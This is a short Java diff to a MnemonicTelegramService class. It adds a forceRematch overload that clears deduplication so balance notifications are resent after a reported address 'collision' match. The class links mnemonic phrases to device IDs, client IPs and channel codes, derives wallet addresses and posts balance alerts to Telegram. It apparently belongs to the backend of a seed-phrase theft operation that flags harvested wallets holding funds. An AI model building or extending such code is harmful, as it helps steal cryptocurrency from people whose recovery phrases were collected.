@@ -90,10 +90,24 @@ public class MnemonicTelegramService {
     public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                               String channelCodeFallback, String clientIpFallback,
                                               List<WalletDerivator.DerivedAddress> derived) {
+        notifyBalanceAfterDeriveAsync(mnemonicId, deviceRowId, deviceId,
+                channelCodeFallback, clientIpFallback, derived, false);
+    }
+
+    /**
+     * @param forceRematch true=上报地址撞库命中后再次通知（覆盖先前 index0 回退通知）
+     */
+    public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, Integer deviceRowId, String deviceId,
+                                              String channelCodeFallback, String clientIpFallback,
+                                              List<WalletDerivator.DerivedAddress> derived,
+                                              boolean forceRematch) {
         if (mnemonicId == null || derived == null || derived.isEmpty()) return;
         List<WalletDerivator.DerivedAddress> copied = new ArrayList<>(derived);
         balanceNotifyExecutor.execute(() -> {
             try {
+                if (forceRematch) {
+                    balanceDedup.remove(mnemonicId);
+                }
                 doBalanceNotify(mnemonicId, deviceRowId, deviceId, channelCodeFallback, clientIpFallback, copied);
             } catch (Exception e) {
                 log.info("异常日志:[telegram] 余额通知失败 mnemonicId={} err={}", mnemonicId, e.getMessage());
